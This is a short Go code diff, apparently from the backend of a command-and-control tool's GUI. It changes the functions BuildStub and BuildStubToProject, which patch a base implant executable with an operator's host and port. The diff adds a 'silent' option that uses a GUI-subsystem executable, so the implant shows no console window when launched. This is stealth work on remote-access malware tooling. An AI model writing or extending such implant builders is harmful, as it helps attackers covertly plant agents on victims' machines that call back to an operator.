@@ -229,9 +229,10 @@ func (a *App) DeleteListener(id string) error {
 // ---- Stub builder ----
 
 // BuildStub patches a base implant exe with a host:port trailer and returns
-// the patched bytes as base64 (the frontend triggers a blob download).
-func (a *App) BuildStub(host, port string) (string, error) {
-	body := map[string]string{"host": host, "port": port}
+// the patched bytes as base64 (the frontend triggers a blob download). When
+// silent is true the GUI-subsystem base exe is used (no console window).
+func (a *App) BuildStub(host, port string, silent bool) (string, error) {
+	body := map[string]any{"host": host, "port": port, "silent": silent}
 	var resp struct {
 		ExeB64 string `json:"exe_b64"`
 	}
@@ -246,8 +247,9 @@ func (a *App) BuildStub(host, port string) (string, error) {
 // "Save As" dialog so the operator chooses where to save the agent exe.
 // Returns the chosen absolute path (JSON string {"path":""}) — path is empty
 // if the operator cancelled. name suggests a default filename in the dialog.
-func (a *App) BuildStubToProject(host, port, name string) (string, error) {
-	body := map[string]string{"host": host, "port": port}
+// silent selects the GUI-subsystem base exe (no console window on launch).
+func (a *App) BuildStubToProject(host, port, name string, silent bool) (string, error) {
+	body := map[string]any{"host": host, "port": port, "silent": silent}
 	var resp struct {
 		ExeB64 string `json:"exe_b64"`
 	}
